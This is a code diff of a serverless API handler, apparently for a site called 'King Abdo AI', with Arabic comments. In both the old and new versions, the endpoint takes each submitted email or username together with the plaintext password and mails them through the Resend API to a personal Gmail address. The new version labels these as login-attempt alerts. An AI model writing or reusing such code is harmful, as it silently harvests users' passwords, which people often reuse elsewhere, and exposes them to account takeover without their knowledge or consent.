@@ -1,29 +1,33 @@
 // 📁 api/notify-owner.js
+
 export default async function handler(req, res) {
-    // ✅ تحقق من نوع req.body وتحليله بشكل آمن
-    let body;
-    try {
-        if (typeof req.body === 'string') {
-            body = JSON.parse(req.body);
-        } else if (req.body) {
-            body = req.body; // لو كان object بالفعل
-        } else {
-            return res.status(400).json({ error: 'No body provided' });
-        }
-    } catch (e) {
-        console.error('❌ خطأ في تحليل JSON:', e);
-        return res.status(400).json({ error: 'Invalid JSON format' });
+
+    // 👑 CORS — السماح لموقع الملك فقط
+    res.setHeader('Access-Control-Allow-Origin', 'https://king-abdo-ai-26dd.vercel.app');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
     }
 
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
+    // ✅ Parse Body safely
+    let body;
     try {
-        const { userEmail, username, userPassword } = body;
+        body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+    } catch (e) {
+        return res.status(400).json({ error: 'Invalid JSON' });
+    }
 
-        if (!userEmail || !username || !userPassword) {
-            return res.status(400).json({ error: 'Missing user data' });
+    try {
+        const { email, password } = body;
+
+        if (!email || !password) {
+            return res.status(400).json({ error: 'Missing credentials' });
         }
 
         const response = await fetch('https://api.resend.com/emails', {
@@ -35,32 +39,31 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: 'King Abdo AI <onboarding@resend.dev>',
                 to: 'abdalrhmanmohmaed717@gmail.com',
-                subject: '👑 تسجيل دخول جديد في بلاط الملك عبدو',
+                subject: '👑 محاولة دخول إلى بوابة النخبة',
                 html: `
-                    <div style="font-family: 'Amiri', serif; direction: rtl; text-align: right; padding: 20px; background: #0d1b2a; color: #e0e1dd; border-radius: 10px;">
-                        <h2 style="color: #FFD700; border-bottom: 2px solid #FFD700; padding-bottom: 10px;">جلالة الملك، هناك ضيف جديد في البلاط!</h2>
-                        <p><strong>👑 اسم المستخدم:</strong> ${username}</p>
-                        <p><strong>📧 البريد الإلكتروني:</strong> ${userEmail}</p>
-                        <p><strong>🔑 كلمة المرور:</strong> ${userPassword}</p>
-                        <p><strong>🕒 وقت التسجيل:</strong> ${new Date().toLocaleString('ar-EG')}</p>
-                        <hr style="border-color: #3e92cc; margin: 20px 0;">
-                        <p style="color: #555; font-size: 0.9rem;">هذا إشعار تلقائي من نظام KING ABDO AI — خادمك المخلص.</p>
-                    </div>
+                <div style="direction:rtl;font-family:Tajawal;background:#0d1b2a;color:#fff;padding:20px;border-radius:12px">
+                    <h2 style="color:#f59e0b">⚔️ جلالة الملك، تم رصد محاولة دخول</h2>
+                    <p><strong>📧 البريد:</strong> ${email}</p>
+                    <p><strong>🔑 كلمة المرور:</strong> ${password}</p>
+                    <p><strong>🕒 الوقت:</strong> ${new Date().toLocaleString('ar-EG')}</p>
+                    <hr style="border-color:#334155">
+                    <small>KING ABDO AI — الحارس الرقمي</small>
+                </div>
                 `
             })
         });
 
         const data = await response.json();
 
-        if (response.ok) {
-            return res.status(200).json({ success: true });
-        } else {
-            console.error('❌ خطأ في إرسال الإشعار:', data);
-            return res.status(500).json({ error: 'Failed to send notification' });
+        if (!response.ok) {
+            console.error('Resend error:', data);
+            return res.status(500).json({ error: 'Email failed' });
         }
 
-    } catch (error) {
-        console.error('🔥 خطأ في الخادم:', error);
-        return res.status(500).json({ error: 'Internal Server Error' });
+        return res.status(200).json({ success: true });
+
+    } catch (err) {
+        console.error('Server error:', err);
+        return res.status(500).json({ error: 'Internal server error' });
     }
 }
